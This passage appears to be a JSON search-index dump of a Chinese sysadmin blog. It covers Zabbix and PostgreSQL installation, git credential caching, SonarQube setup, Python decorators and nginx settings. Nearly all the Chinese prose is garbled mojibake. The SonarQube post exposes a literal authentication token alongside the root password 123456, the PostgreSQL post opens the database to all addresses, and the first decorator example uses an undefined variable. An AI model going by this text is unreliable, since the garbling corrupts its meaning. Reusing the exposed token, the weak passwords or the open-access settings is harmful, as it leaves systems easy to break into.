01:31","objectID":"/post/1414/:0:0","tags":["python"],"title":"pythonå¸¸ç”¨æ¨¡å—","uri":"/post/1414/"},{"categories":["ç›‘æ§"],"content":"å®‰è£…zabbix-agent rpm -ivh https://mirrors.tuna.tsinghua.edu.cn/zabbix/zabbix/4.0/rhel/7/x86_64/zabbix-agent-4.0.16-1.el7.x86_64.rpm ä¸»è¦ä¿®æ”¹ï¼š Serverï¼šzabbix-serveråœ°å€ ServerActiveï¼šä¸»åŠ¨æ¨¡å¼zabbix-serveråœ°å€ Hostnameï¼šä¸»æœºå HostMetadataï¼šå…ƒæ•°æ® vim /etc/zabbix/zabbix_agentd.conf Server=192.168.0.200 ServerActive=192.168.0.200 Hostname=web-01 HostMetadata=web systemctl restart zabbix-agent é…ç½®zabbix 1.åˆ›å»º é…ç½®å®Œåï¼Œé‡å¯agentå³å¯ã€‚ ","date":"2020-01-16 17:59","objectID":"/post/1408/:0:0","tags":["zabbix"],"title":"zabbixé€šè¿‡è‡ªåŠ¨æ³¨å†Œåˆ›å»ºä¸»æœº","uri":"/post/1408/"},{"categories":["ç›‘æ§"],"content":"å®‰è£…zabbix-agent rpm -ivh https://mirrors.tuna.tsinghua.edu.cn/zabbix/zabbix/4.0/rhel/7/x86_64/zabbix-agent-4.0.16-1.el7.x86_64.rpm sed -i s#^Server=.*#Server=zabbix-serveråœ°å€# /etc/zabbix/zabbix_agentd.conf systemctl restart zabbix-agent é…ç½®zabbix 1.åˆ›å»ºè‡ªåŠ¨å‘ç°è§„åˆ™ ä¿®æ”¹IPèŒƒå›´å’Œæ£€æŸ¥æ¡ä»¶ 2.åˆ›å»ºè‡ªåŠ¨å‘ç°åŠ¨ä½œ æ·»åŠ æ‰§è¡ŒåŠ¨ä½œæ¡ä»¶ é…ç½®æ‰§è¡ŒåŠ¨ä½œ ","date":"2020-01-16 17:05","objectID":"/post/1405/:0:0","tags":["zabbix"],"title":"zabbixé€šè¿‡è‡ªåŠ¨å‘ç°åˆ›å»ºä¸»æœº","uri":"/post/1405/"},{"categories":["å…¶ä»–","ç³»ç»ŸæœåŠ¡"],"content":"cdÂ /server/packages/php-5.6.40/ext/gettext /server/packages/php-5.6.40/ext/gettext /application/php/bin/phpize ./configure â€“with-php-config=/application/php5.6.40/bin/php-config make \u0026\u0026 make install åœ¨;Dynamic Extensionséƒ¨åˆ†ä¸‹é¢æ·»åŠ æ¨¡å— vimÂ /application/php/etc/php.ini extension=gettext.so ","date":"2020-01-16 11:22","objectID":"/post/1399/:0:0","tags":["php"],"title":"phpç¼–è¯‘æ‰©å±•","uri":"/post/1399/"},{"categories":["ç›‘æ§"],"content":"ä¸‹è½½åœ°å€ï¼š https://nchc.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/4.0.16/zabbix-4.0.16.tar.gz è§£å‹å®‰è£…ï¼š tar xf zabbix-4.0.16.tar.gz groupadd zabbix useradd -g zabbix zabbix yum install -y net-snmp net-snmp-devel libeventÂ libevent-devel ./configure â€“prefix=/application/zabbix â€“enable-server â€“enable-agent â€“with-mysql â€“enable-ipv6 â€“with-net-snmp â€“with-libcurl â€“with-libxml2 make install echo â€™export PATH=/application/zabbix/sbin:$PATHâ€™Â \u003e\u003e /etc/profile é…ç½®mysqlï¼š create database zabbix character set utf8 collate utf8_bin; grant all privileges on zabbix.* to â€˜zabbixâ€™@â€™localhostâ€™ identified by â€˜\u003cpassword\u003eâ€™; å¯¼å…¥åº“ï¼š cd /server/packages/zabbix-4.0.16/frontends/phpdatabase/mysql mysql -uzabbix -p\u003cpassword\u003e zabbix \u003c schema.sql ä¸‹é¢æ­¥éª¤å½“åˆ›å»ºZabbix proxyæ•°æ®åº“æ—¶ä¸éœ€è¦æ‰§è¡Œ mysql -uzabbix -p\u003cpassword\u003e zabbix \u003c images.sql mysql -uzabbix -p\u003cpassword\u003e zabbix \u003c data.sql é…ç½®zabbix_server vim /application/zabbix/etc/zabbix_server.conf DBName=zabbix DBUser=zabbix DBUser=zabbix å¯åŠ¨zabbix_server(agentåŒç†) su - zabbix -c zabbix_server å®‰è£…zabbix_web /server/packages/zabbix-4.0.16/frontends/php cp -a /application/zabbix_web æ‰“å¼€æµè§ˆå™¨å®‰è£… zabbix-serverå¯åŠ¨è„šæœ¬ [Unit] Description=zabbix server After=syslog.target network.target [Service] Type=simple PIDFile=/tmp/zabbix_server.pid ExecStart=/application/zabbix/sbin/zabbix_server ExecReload=/bin/kill -USR2 $MAINPID ExecStop=/bin/kill -SIGTERM $MAINPID [Install] WantedBy=multi-user.target","date":"2020-01-16 11:04","objectID":"/post/1395/:0:0","tags":["zabbix"],"title":"zabbix4.0ç¼–è¯‘å®‰è£…","uri":"/post/1395/"},{"categories":["ç›‘æ§"],"content":"å®˜æ–¹æ–‡æ¡£ï¼š https://www.zabbix.com/documentation/4.0/zh/manual/installation/install Optional Packages: --with-PACKAGE[=ARG] use PACKAGE [ARG=yes] --without-PACKAGE do not use PACKAGE (same as --with-PACKAGE=no) --with-ibm-db2[=ARG] use IBM DB2 CLI from given sqllib directory (ARG=path); use /home/db2inst1/sqllib (ARG=yes); disable IBM DB2 support (ARG=no) --with-ibm-db2-include[=DIR] use IBM DB2 CLI headers from given path --with-ibm-db2-lib[=DIR] use IBM DB2 CLI libraries from given path --with-mysql[=ARG] use MySQL client library [default=no], optionally specify path to mysql_config --with-oracle[=ARG] use Oracle OCI API from given Oracle home (ARG=path); use existing ORACLE_HOME (ARG=yes); disable Oracle OCI support (ARG=no) --with-oracle-include[=DIR] use Oracle OCI API headers from given path --with-oracle-lib[=DIR] use Oracle OCI API libraries from given path --with-postgresql[=ARG] use PostgreSQL library [default=no], optionally specify path to pg_config --with-sqlite3[=ARG] use SQLite 3 library [default=no], optionally specify the prefix for sqlite3 library If you want to use Jabber protocol for messaging: --with-jabber[=DIR] Include Jabber support [default=no]. DIR is the iksemel library install directory. If you want to use XML library: --with-libxml2[=ARG] use libxml2 client library [default=no], optionally specify path to xml2-config If you want to use unixODBC library: --with-unixodbc[=ARG] use ODBC driver against unixODBC package [default=no], optionally specify full path to odbc_config binary. If you want to use Net-SNMP library: --with-net-snmp[=ARG] use Net-SNMP package [default=no], optionally specify path to net-snmp-config If you want to use SSH2 based checks: --with-ssh2[=DIR] use SSH2 package [default=no], DIR is the SSH2 library install directory. If you want to check IPMI devices: --with-openipmi[=DIR] Include OPENIPMI support [default=no]. DIR is the OPENIPMI base install directory, default is to search through a number of common places for the OPENIPMI files. If you want to specify zlib installation directories: --with-zlib=DIR use zlib from given base install directory (DIR), default is to search through a number of common places for the zlib files. --with-zlib-include=DIR use zlib include headers from given path. --with-zlib-lib=DIR use zlib libraries from given path. If you want to specify pthread installation directories: --with-libpthread[=DIR] use libpthread from given base install directory (DIR), default is to search through a number of common places for the libpthread files. --with-libpthread-include[=DIR] use libpthread include headers from given path. --with-libpthread-lib[=DIR] use libpthread libraries from given path. If you want to specify libevent installation directories: --with-libevent[=DIR] use libevent from given base install directory (DIR), default is to search through a number of common places for the libevent files. --with-libevent-include[=DIR] use libevent include headers from given path. --with-libevent-lib[=DIR] use libevent libraries from given path. If you want to use encryption provided by mbed TLS (PolarSSL) library: --with-mbedtls[=DIR] use mbed TLS (PolarSSL) package [default=no], DIR is the libpolarssl install directory. If you want to use encryption provided by GnuTLS library: --with-gnutls[=DIR] use GnuTLS package [default=no], DIR is the libgnutls install directory. If you want to use encryption provided by OpenSSL library: --with-openssl[=DIR] use OpenSSL package [default=no], DIR is the libssl and libcrypto install directory. If you want to check LDAP servers: --with-ldap[=DIR] Include LDAP support [default=no]. DIR is the LDAP base install directory, default is to search through a number of common places for the LDAP files. If you want to use cURL library: --with-libcurl[=DIR] use cURL package [default=no], optionally specify path to curl-config If you want to specify libpcre installation directories: --with-libpcre[=DIR] use libpcre from given base install directory","date":"2020-01-16 10:17","objectID":"/post/1392/:0:0","tags":["zabbix"],"title":"zabbix4.0ç¼–è¯‘å®‰è£…å‚æ•°","uri":"/post/1392/"},{"categories":["python"],"content":"vi ~/.pip/pip.conf [global] trusted-host = mirrors.aliyun.com index-url = https://mirrors.aliyun.com/pypi/simple 1ã€http://mirrors.aliyun.com/pypi/simple/ 2ã€http://pypi.douban.com/simple/ 3ã€https://pypi.tuna.tsinghua.edu.cn/simple/ 4ã€http://pypi.mirrors.ustc.edu.cn/simple/ ","date":"2020-01-16 09:17","objectID":"/post/1389/:0:0","tags":["python"],"title":"pipæºåŠ é€Ÿä¿®æ”¹","uri":"/post/1389/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"è®¤è¯æ–¹å¼è¯´æ˜ï¼š https://www.postgresql.org/docs/9.4/auth-methods.html ä¿®æ”¹ï¼š vimÂ /data/postgresql/pg_hba.conf IPv4 local connections: host all all 0.0.0.0/0 md5 vim /data/postgresql/postgresql.conf listen_addresses = â€˜*â€™ é‡å¯æœåŠ¡ï¼š pg_ctl stop -D /data/postgresql/ -s -m fast pg_ctl start -D /data/postgresql/ -s -w -t 300 ","date":"2020-01-15 11:35","objectID":"/post/1385/:0:0","tags":["postgresql","pgsql"],"title":"pgsql è®¾ç½®ç›‘å¬åœ°å€æä¾›å¤–éƒ¨è®¿é—®","uri":"/post/1385/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ä¸‹è½½äºŒè¿›åˆ¶åŒ…ï¼š wget http://get.enterprisedb.com/postgresql/postgresql-9.4.25-1-linux-x64-binaries.tar.gz åˆ›å»ºç›®å½•ï¼š mkdir /application/ mkdir /data/postgresql æ·»åŠ ç”¨æˆ·ï¼š useradd postgres chown -R postgres.postgres /data/postgresql/ è§£å‹ï¼š tar xf postgresql-9.4.25-1-linux-x64-binaries.tar.gz -C /application/ echo 'export PATH=$PATH:/application/pgsql/bin/' \u003e\u003e /etc/profile source /etc/profile ä½¿ç”¨postgresç”¨æˆ·åˆå§‹åŒ–æ•°æ®åº“ï¼š su postgres initdb -D /data/postgresql/ ä¿®æ”¹é…ç½®æ–‡ä»¶ data_directory = '/data/postgresql/' listen_addresses = '127.0.0.1,10.0.0.92' max_connections = 1000 logging_collector = on log_destination = 'stderr' log_directory = 'pg_log' log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log' # å½“æ—¥å¿—æ–‡ä»¶å·²å­˜åœ¨æ—¶,ä½¿ç”¨è¿½åŠ çš„æ–¹å¼å†™æ—¥å¿— log_truncate_on_rotation = off log_rotation_age = 1d log_rotation_size = 10MB log_duration = on log_min_duration_statement = 4000 log_connections = on log_disconnections = on # æ—¥å¿—å‰ç¼€: \u003c æ—¥æœŸ è¿›ç¨‹id ç”¨æˆ·å æ•°æ®åº“åç§° è¿œç¨‹ä¸»æœºç«¯å£ è¿æ¥åº”ç”¨\u003e log_line_prefix = '\u003c %m %p %u %d %r %a \u003e' log_statement = 'ddl' datestyle = 'iso, mdy' log_timezone = 'Asia/Shanghai' å¯åŠ¨æœåŠ¡ï¼š cd /data/postgresql pg_ctl -D /data/postgresql/ start è¿æ¥æ•°æ®åº“ï¼š psql -U postgres ä¿®æ”¹å¯†ç ï¼š ALTER USER postgres with encrypted password 'å¯†ç '; åˆ›å»ºç”¨æˆ·å’Œåº“ postgres=# create user ç”¨æˆ·å with password '123'; postgres=# create database åº“å with encoding='utf8' owner=ç”¨æˆ·å; å¼€å¯ã€åœæ­¢ã€é‡å¯ï¼š #Start pg_ctl start -D ${PGDATA} -s -w -t 300 #Stop pg_ctl stop -D ${PGDATA} -s -m fast #Reload pg_ctl reload -D ${PGDATA} -s systemdç®¡ç† [Unit] Description=PostgreSQL 9.4 database server Documentation=https://www.postgresql.org/docs/9.4/static/ After=syslog.target After=network.target [Service] Type=forking User=postgres Group=postgres # Note: avoid inserting whitespace in these Environment= lines, or you may # break postgresql-setup. # Location of database directory Environment=PGDATA=/data/postgresql/ # Where to send early-startup messages from the server (before the logging # options of postgresql.conf take effect) # This is normally controlled by the global default set by systemd # StandardOutput=syslog # Disable OOM kill on the postmaster OOMScoreAdjust=-1000 ExecStartPre=/application/pgsql/bin/postgresql94-check-db-dir ${PGDATA} ExecStart=/application/pgsql/bin/pg_ctl start -D ${PGDATA} -s -w -t 300 ExecStop=/application/pgsql/bin/pg_ctl stop -D ${PGDATA} -s -m fast ExecReload=/application/pgsql/bin/pg_ctl reload -D ${PGDATA} -s # Do not set any timeout value, so that systemd will not kill postmaster # during crash recovery. TimeoutSec=0 [Install] WantedBy=multi-user.target ","date":"2020-01-15 10:44","objectID":"/post/1373/:0:0","tags":["postgresql","pgsql"],"title":"pgsql9.4äºŒè¿›åˆ¶å®‰è£…","uri":"/post/1373/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"killï¼šæ ¹æ®è¿›ç¨‹å· pkillï¼šæ ¹æ®è¿›ç¨‹åï¼ˆæ¨¡ç³ŠåŒ¹é…ï¼‰pkill sh ä¼šæŠŠsshdä¹Ÿkillæ‰ killallï¼šæ ¹æ®è¿›ç¨‹å ","date":"2020-01-14 11:21","objectID":"/post/1371/:0:0","tags":[],"title":"killä¸‰äººç»„","uri":"/post/1371/"},{"categories":["kubernetes"],"content":"https://www.cnblogs.com/linuxk/p/9578211.html ","date":"2020-01-14 10:56","objectID":"/post/1369/:0:0","tags":["k8s"],"title":"k8s yamlå‚æ•°","uri":"/post/1369/"},{"categories":["kubernetes"],"content":"journalctl -u kubelet.service -f test-k8s-node3 kubelet[10533]: W0114 10:24:01.970016 10533 eviction_manager.go:160] Failed to admit pod kube-flannel-ds-amd64-6hwz9_kube-system(eda94251-3674-11ea-be8c-fa163e30703c) - node has conditions: [DiskPressure] ç”±æ­¤çœ‹å‡ºåº”è¯¥å’Œç¡¬ç›˜æœ‰å…³ç³» df -h æ¸…ç†å‡ºç©ºé—´åå°±æ¢å¤æ­£å¸¸äº† https://my.oschina.net/xiaominmin/blog/1944054?spm=a2c4e.10696291.0.0.6fa919a4mLW72v ","date":"2020-01-14 10:45","objectID":"/post/1366/:0:0","tags":["k8s"],"title":"k8sè°ƒåº¦nodeå¤±è´¥","uri":"/post/1366/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"-s ours è¯¥å‚æ•°å°†å¼ºè¿«å†²çªå‘ç”Ÿæ—¶ï¼Œè‡ªåŠ¨ä½¿ç”¨å½“å‰åˆ†æ”¯çš„ç‰ˆæœ¬ã€‚è¿™ç§åˆå¹¶æ–¹å¼ä¸ä¼šäº§ç”Ÿä»»ä½•å›°æ‰°æƒ…å†µï¼Œç”šè‡³gitéƒ½ä¸ä¼šå»æ£€æŸ¥å…¶ä»–åˆ†æ”¯ç‰ˆæœ¬æ‰€åŒ…å«çš„å†²çªå†…å®¹è¿™ç§æ–¹å¼ä¼šæŠ›å¼ƒå¯¹æ–¹åˆ†æ”¯ä»»ä½•å†²çªå†…å®¹ã€‚ ä½¿ç”¨devåˆ†æ”¯æ›¿æ¢masteråˆ†æ”¯ git checkout dev git merge -s ours master git checkout master git merge dev git push origin master æ¢å¤ä¸Šä¸€æ­¥çš„è¿‡ç¨‹ 1.git reset â€“hard 73a828895ad167339752c3fbba2be3564cdbdfa7 2.å…³é—­masteråˆ†æ”¯ä¿æŠ¤ 3.git push origin master â€“force ","date":"2020-01-03 17:53","objectID":"/post/1340/:0:0","tags":["git"],"title":"gitä½¿ç”¨å…¶ä»–åˆ†æ”¯æ›¿æ¢masteråˆ†æ”¯","uri":"/post/1340/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"è®¾ç½®è®°ä½å¯†ç ï¼ˆé»˜è®¤15åˆ†é’Ÿï¼‰ git config --global credential.helper cache è‡ªå®šä¹‰æ—¶é—´ï¼ˆ1å°æ—¶ï¼‰ git config credential.helper 'cache --timeout=3600' æ·»åŠ å…¨å±€è®°ä½è´¦å·å¯†ç  git config --global credential.helper store å¯†ç å‘ç”Ÿæ”¹å˜åé‡ç½®å¯†ç  git config --system --unset credential.helper ","date":"2020-01-03 17:49","objectID":"/post/1337/:0:0","tags":["git"],"title":"gitè®°ä½è´¦å·å¯†ç ","uri":"/post/1337/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1.å®‰è£…mysql5.7 2.å¯åŠ¨æ•°æ®åº“ï¼Œé…ç½®å¯†ç ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªsonaråº“ vim /etc/my.cnf max_allowed_packet = 64M systemctl start mysqld mysqladmin password 123456 mysql -uroot -p123456 -e \"CREATE DATABASE sonar DEFAULT CHARACTER SET utf8;\" mysql -uroot -p123456 -e \"show databases;\" 3.å®‰è£…sonarqube wget https://binaries.sonarsource.com/Distribution/sonarqube/sonarqube-7.0.zip unzip sonarqube-7.0.zip -d /usr/local/ useradd sonar -M -s /sbin/nologin chown -R sonar.sonar /usr/local/sonarqube-7.0/ ln -s /usr/local/sonarqube-7.0/ /usr/local/sonarqube 4.ä¿®æ”¹sonaré…ç½®æ–‡ä»¶ vim /usr/local/sonarqube/conf/sonar.properties sonar.jdbc.username=root sonar.jdbc.password=123456 sonar.jdbc.url=jdbc:mysql://localhost:3306/sonar?useUnicode=true\u0026characterEncoding=utf8\u0026rewriteBatchedStatements=true\u0026useConfigs=maxPerformance\u0026useSSL=false 5.å¯åŠ¨sonar su -s /bin/bash - sonar -c /usr/local/sonarqube/bin/linux-x86-64/sonar.sh start 6.è®¿é—® http://IP:9000/ ç”¨æˆ·åå¯†ç ï¼šadmin 7.ç”Ÿæˆtokenä»¤ç‰Œ gitlab:Â c8f7808f87bf63f857707fba1b571cf53debe8e7 8.æ‰‹åŠ¨æ£€æµ‹ï¼Œ-Dsonar.projectKey=htmlæŒ‡å®šå…³é”®å­— #maven mvn sonar:sonar \\ -Dsonar.host.url=http://10.0.0.51:9000 \\ -Dsonar.login=c8f7808f87bf63f857707fba1b571cf53debe8e7 #html sonar-scanner \\ -Dsonar.projectKey=html \\ -Dsonar.sources=. \\ -Dsonar.host.url=http://10.0.0.51:9000 \\ -Dsonar.login=c8f7808f87bf63f857707fba1b571cf53debe8e7 #js sonar-scanner \\ -Dsonar.projectKey=js \\ -Dsonar.projectName=jsé¡¹ç›® \\ -Dsonar.sources=. \\ -Dsonar.host.url=http://10.0.0.51:9000 \\ -Dsonar.login=c8f7808f87bf63f857707fba1b571cf53debe8e7 ","date":"2020-01-01 11:23","objectID":"/post/1331/:0:0","tags":["maven"],"title":"sonarqubeè®°å½•","uri":"/post/1331/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"java -Dspring.profiles.active=test -jar xxx.jar ","date":"2019-12-31 11:26","objectID":"/post/1326/:0:0","tags":["java"],"title":"springbootæŒ‡å®šjaråŒ…è¿è¡Œç¯å¢ƒ","uri":"/post/1326/"},{"categories":["python"],"content":"è£…é¥°å™¨åŸåˆ™ï¼š 1.ä¸æ”¹å˜åŸæœ‰ä»£ç  2.ä¸æ”¹å˜è°ƒç”¨æ–¹å¼ 3.ä¸æ”¹å˜åŸå‡½æ•°è¿”å›å€¼ ","date":"2019-12-30 18:29","objectID":"/post/1320/:1:0","tags":["python"],"title":"python-è£…é¥°å™¨","uri":"/post/1320/"},{"categories":["python"],"content":"ä¾‹å¦‚ï¼š ä¸€ä¸ªæ™®é€šçš„å‡½æ•° import time def web(s): time.sleep(2) print(s) ","date":"2019-12-30 18:29","objectID":"/post/1320/:2:0","tags":["python"],"title":"python-è£…é¥°å™¨","uri":"/post/1320/"},{"categories":["python"],"content":"ä¸€ã€ ä¸‹é¢ç”¨è£…é¥°å™¨å®ç°è®¡ç®—æ­¤å‡½æ•°çš„è¿è¡Œæ—¶é—´ def timer(f): def inner(*args, **kwargs): start = time.time() result = f(*args, **kwargs) end = time.time() print(\"{}å‡½æ•°æ‰§è¡Œäº†{}s.\".format(f.__name__, stop - start)) return result return inner @timer # ç›¸å½“äºweb=timer(web) def web(s): time.sleep(2) print(s) return True print(web('å“’å“’å“’å“’å“’å“’')) # ç›¸å½“äºæ‰§è¡Œinner('å“’å“’å“’å“’å“’å“’') ä¸Šé¢çš„è£…é¥°å™¨æœ¬èº«æ˜¯æ²¡æœ‰å‚æ•°çš„ï¼Œä¸‹é¢æˆ‘æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæœ‰å‚æ•°çš„è£…é¥°å™¨ ","date":"2019-12-30 18:29","objectID":"/post/1320/:2:1","tags":["python"],"title":"python-è£…é¥°å™¨","uri":"/post/1320/"},{"categories":["python"],"content":"äºŒã€ åœ¨è°ƒç”¨è£…é¥°å™¨çš„æ—¶å€™è·å–æŒ‡å®šå•ä½çš„æ—¶é—´ import time def timer(unit=\"s\"): def wrapper(f): def inner(*args, **kwargs): start = time.time() result = f(*args, **kwargs) stop = time.time() exec_time = stop - start if unit == 's': print(\"{}å‡½æ•°æ‰§è¡Œäº†{}s.\".format(f.__name__, int(exec_time))) elif unit == 'ms': print(\"{}å‡½æ•°æ‰§è¡Œäº†{:.1f}ms.\".format(f.__name__, exec_time * 1000)) return result return inner return wrapper @timer(unit='ms') # timer(unit='ms')æ‰§è¡Œç»“æœæ˜¯wrapper,ç›¸å½“äº@wrapper,ç„¶åå°±æ˜¯web=wrapper(web).web=inner def web(s): time.sleep(2) print(s) return True print(web('å“’å“’å“’å“’å“’å“’')) # inner('å“’å“’å“’å“’å“’å“’'),innerçš„çˆ¶çº§å‡½æ•°æœ‰unitè¿™ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥å®ç°æ˜¾ç¤ºä¸åŒå•ä½çš„æ—¶é—´ ä¸Šé¢çš„è£…é¥°å™¨åŸºæœ¬æ²¡æœ‰ä»€ä¹ˆå¤§é—®é¢˜äº†ï¼Œä½†æ˜¯å‡½æ•°æ˜¯æœ‰å®ƒçš„å±æ€§çš„ï¼Œæ¯”å¦‚__name__ã€docã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼ä¿®æ”¹ import time from functools import wraps # å¯¼å…¥æ¨¡å— def timer(unit=\"s\"): def wrapper(f): @wraps(f) # åœ¨å†…éƒ¨çš„å‡½æ•°ä¸­ä½¿ç”¨wrapsè£…é¥°å™¨å°±å¯ä»¥äº† def inner(*args, **kwargs): start = time.time() result = f(*args, **kwargs) stop = time.time() exec_time = stop - start if unit == 's': print(\"{}å‡½æ•°æ‰§è¡Œäº†{}s.\".format(f.__name__, int(exec_time))) elif unit == 'ms': print(\"{}å‡½æ•°æ‰§è¡Œäº†{:.1f}ms.\".format(f.__name__, exec_time * 1000)) return result return inner return wrapper @timer(unit='ms') # timer(unit='ms')æ‰§è¡Œç»“æœæ˜¯wrapper,ç›¸å½“äº@wrapper,ç„¶åå°±æ˜¯web=wrapper(web).web=inner def web(s): time.sleep(2) print(s) return True print(web('å“’å“’å“’å“’å“’å“’')) # inner('å“’å“’å“’å“’å“’å“’'),innerçš„çˆ¶çº§å‡½æ•°æœ‰unitè¿™ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥å®ç°æ˜¾ç¤ºä¸åŒå•ä½çš„æ—¶é—´ ","date":"2019-12-30 18:29","objectID":"/post/1320/:2:2","tags":["python"],"title":"python-è£…é¥°å™¨","uri":"/post/1320/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ·»åŠ  ip addr add 10.0.0.3/24 dev eth0 åˆ é™¤ ip addr del 10.0.0.3/24 dev eth0 ","date":"2019-12-25 16:32","objectID":"/post/1318/:0:0","tags":[],"title":"centosä¸ºç½‘å¡æ·»åŠ è™šæ‹Ÿip","uri":"/post/1318/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/ccschan/article/details/88095448 user nobody nobody; ## æŒ‡å®šè¿è¡Œç”¨æˆ·å’Œç»„ worker_processes 4; ## æŒ‡å®šworkeræ•°é‡ï¼Œå»ºè®®æ­¤å¤„auto worker_rlimit_nofile 51200; ## æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦ error_log logs/error.log notice; pid /var/run/nginx.pid; events { use epoll; ## ä½¿ç”¨epolläº‹ä»¶é©±åŠ¨æ¨¡å‹ worker_connections 51200; ## ä¸€ä¸ªworkerèƒ½å¤„ç†çš„æœ€å¤§å¹¶å‘ } http { server_tokens off; ## éšè—nginxç‰ˆæœ¬ include mime.types; proxy_redirect off; ## å…³é—­ä»£ç†é‡å®šå‘ proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; client_max_body_size 20m; ## è®¾ç½®å®¢æˆ·ç«¯è¯·æ±‚bodyçš„æœ€å¤§å…è®¸å¤§å° client_body_buffer_size 256k; ## è®¾ç½®å®¢æˆ·ç«¯è¯·æ±‚bodyçš„ç¼“å†²åŒºå¤§å° proxy_connect_timeout 90; ## ä¸åç«¯æœåŠ¡å™¨è¿æ¥çš„è¶…æ—¶æ—¶é•¿ proxy_send_timeout 90; ## æŠŠè¯·æ±‚å‘é€ç»™åç«¯æœåŠ¡å™¨çš„è¶…æ—¶æ—¶é•¿ proxy_read_timeout 90; ## ç­‰å¾…åç«¯æœåŠ¡å™¨å‘é€å“åº”æŠ¥æ–‡çš„è¶…æ—¶æ—¶é•¿ proxy_buffer_size 128k; ## ä»ä»£ç†æœåŠ¡å™¨æ¥æ”¶çš„å“åº”çš„ç¬¬ä¸€éƒ¨åˆ†ç¼“å†²åŒº proxy_buffers 4 64k; ## ä»ä»£ç†æœåŠ¡å™¨è¯»å–å“åº”çš„ç¼“å†²åŒºnumberå’Œsize proxy_busy_buffers_size 128k; ## é™åˆ¶sizeåœ¨å“åº”å°šæœªå®Œå…¨è¯»å–æ—¶å¯èƒ½å¿™äºå‘å®¢æˆ·ç«¯å‘é€å“åº”çš„ç¼“å†²åŒºæ€»æ•° proxy_temp_file_write_size 128k; ## è¯¥æŒ‡ä»¤è®¾ç½®ç¼“å†²ä¸´æ—¶æ–‡ä»¶çš„æœ€å¤§å€¼ default_type application/octet-stream; charset utf-8; ## å­—ç¬¦é›† client_body_temp_path /var/tmp/client_body_temp 1 2; ## è¯·æ±‚bodyä¸´æ—¶ç›®å½• proxy_temp_path /var/tmp/proxy_temp 1 2; ## ä»£ç†æœåŠ¡å™¨æ¥å—æ•°æ®ä¸´æ—¶ç›®å½• fastcgi_temp_path /var/tmp/fastcgi_temp 1 2; ## FastCGIæœåŠ¡å™¨æ¥æ”¶ä¸´æ—¶ç›®å½• uwsgi_temp_path /var/tmp/uwsgi_temp 1 2; ## uwsgi æœåŠ¡å™¨æ¥æ”¶ä¸´æ—¶ç›®å½• scgi_temp_path /var/tmp/scgi_temp 1 2; ##scgiæœåŠ¡å™¨æ¥æ”¶ä¸´æ—¶ç›®å½• ignore_invalid_headers on; ## å¼€å¯æ§åˆ¶å¿½ç•¥å…·æœ‰æ— æ•ˆåç§°çš„æ ‡å¤´å­—æ®µ server_names_hash_max_size 256; ## æœåŠ¡å™¨åç§°å“ˆå¸Œè¡¨çš„æœ€å¤§å€¼ server_names_hash_bucket_size 64; ## æœåŠ¡å™¨åç§°å“ˆå¸Œè¡¨å­˜å‚¨bucketå¤§å° client_header_buffer_size 8k; ## è®¾ç½®ç¼“å†²åŒºä»¥è¯»å–å®¢æˆ·ç«¯è¯·æ±‚æ ‡å¤´ large_client_header_buffers 4 32k; ## è®¾ç½®ç¼“å†²åŒºä»¥è¯»å–å®¢æˆ·ç«¯è¯·æ±‚æ ‡å¤´æœ€å¤§å€¼numberå’Œsize connection_pool_size 256; ## å…è®¸ç²¾ç¡®è°ƒæ•´æ¯ä¸ªè¿æ¥çš„å†…å­˜åˆ†é… request_pool_size 64k; ## å…è®¸ç²¾ç¡®è°ƒæ•´æ¯ä¸ªè¯·æ±‚çš„å†…å­˜åˆ†é… output_buffers 2 128k; ## è®¾ç½®ç”¨äºä»ç£ç›˜è¯»å–å“åº”çš„ç¼“å†²åŒºnumberå’Œsize postpone_output 1460; ## å®¢æˆ·ç«¯æ•°æ®çš„ä¼ è¾“æœ€å°å€¼ï¼Œå•ä½å­—èŠ‚ client_header_timeout 1m; ## å®šä¹‰è¯»å–å®¢æˆ·ç«¯è¯·æ±‚æ ‡å¤´çš„è¶…æ—¶æ—¶é•¿ client_body_timeout 3m; ## å®šä¹‰è¯»å–å®¢æˆ·ç«¯è¯·æ±‚ä¸»ä½“çš„è¶…æ—¶æ—¶é•¿ send_timeout 3m; ## è®¾ç½®å°†å“åº”ä¼ è¾“åˆ°å®¢æˆ·ç«¯çš„è¶…æ—¶æ—¶é•¿ log_format main '$server_addr $remote_addr [$time_local] $msec+$connection ' '\"$request\" $status $connection $request_time $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; open_log_file_cache max=1000 inactive=20s min_uses=1 valid=1m; access_log logs/access.log main; log_not_found on; sendfile on; tcp_nodelay on; ## å¯ç”¨é•¿è¿æ¥é©¬ä¸Šå“åº”ï¼Œæé«˜æ€§èƒ½ tcp_nopush off; ## å…³é—­å¥—æ¥å­—é€‰é¡¹ reset_timedout_connection on; ## å¯ç”¨é‡ç½®è¶…æ—¶è¿æ¥ keepalive_timeout 10 5; ## ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®é•¿è¿æ¥è¶…æ—¶æ—¶é•¿ï¼Œç¬¬äºŒä¸ªæµè§ˆå™¨è¯†åˆ«ä¸ºkeep-alive:timeout=5 keepalive_requests 100; ## è®¾ç½®å¯é€šè¿‡ä¸€ä¸ªä¿æŒæ´»åŠ¨è¿æ¥æä¾›çš„æœ€å¤§è¯·æ±‚æ•° gzip on; ## å¼€å¯å‹ç¼© gzip_http_version 